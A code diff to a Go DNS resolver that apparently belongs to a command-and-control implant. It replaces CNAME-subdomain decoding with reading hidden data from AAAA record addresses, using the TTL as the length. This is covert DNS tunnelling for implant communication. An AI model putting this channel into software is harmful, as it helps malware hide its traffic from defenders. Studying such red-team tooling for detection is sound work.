@@ -22,7 +22,6 @@ import (
 	"crypto/rand"
 	"encoding/binary"
 	"errors"
-	"hash/crc32"
 	"strings"
 	"time"
 
@@ -151,31 +150,24 @@ func (r *GenericResolver) aaaa(domain string) ([]byte, time.Duration, error) {
 		return nil, rtt, ErrInvalidRcode
 	}
 	records := []byte{}
+	dataSize := 0
 	for _, answer := range resp.Answer {
 		switch answer := answer.(type) {
-		case *dns.CNAME:
+		case *dns.AAAA:
 			// {{if .Config.Debug}}
-			log.Printf("[dns] answer (cname): %s", answer.Target)
+			log.Printf("[dns] answer (aaaa): %v", answer.AAAA)
 			// {{end}}
 
-			target := answer.Target
-			if 0 < len(target) {
-
-				b := []byte(target)
-				subdomain := b[:len(b)-len(r.parent)]
-				// {{if .Config.Debug}}
-				log.Printf("[dns] processing req for subdomain = %s", subdomain)
-				// {{end}}
-				msgData, _, err := r.decodeSubdata(string(subdomain))
-				if err != nil {
-					break
-				}
-				records = append(records, []byte(msgData)...)
-
-			}
+			dataSize = int(answer.Hdr.Ttl)
+			records = append(records, []byte(answer.AAAA)...)
 		}
 	}
-	return records, rtt, err
+
+	// Trim output data
+	data := make([]byte, dataSize)
+	copy(data, records[0:dataSize])
+
+	return data, rtt, err
 }
 
 // TXT - Query for TXT records
@@ -248,24 +240,4 @@ func headerID() uint16 {
 	buf := make([]byte, 2)
 	rand.Read(buf)
 	return binary.LittleEndian.Uint16(buf)
-}
-
-// Parse subdomain as data and calculate the CRC32 checksum, I decided to add the
-// checksum calculation here to ensure that no one accidentally calculates the crc32
-// of the plaintext data (that would be very bad).
-func (r *GenericResolver) decodeSubdata(subdomain string) ([]byte, uint32, error) {
-	subdata := strings.Join(strings.Split(subdomain, "."), "")
-	// {{if .Config.Debug}}
-	log.Printf("subdata = %s", subdata)
-	// {{end}}
-	encoder := encoders.Base32{}
-	data, err := encoder.Decode([]byte(subdata))
-	if err == nil {
-		return data, crc32.ChecksumIEEE(data), nil
-	}
-	// {{if .Config.Debug}}
-	log.Printf("failed to decode subdata with %#v (%s)", encoder, err)
-	// {{end}}
-
-	return nil, 0, ErrInvalidMsg
 }
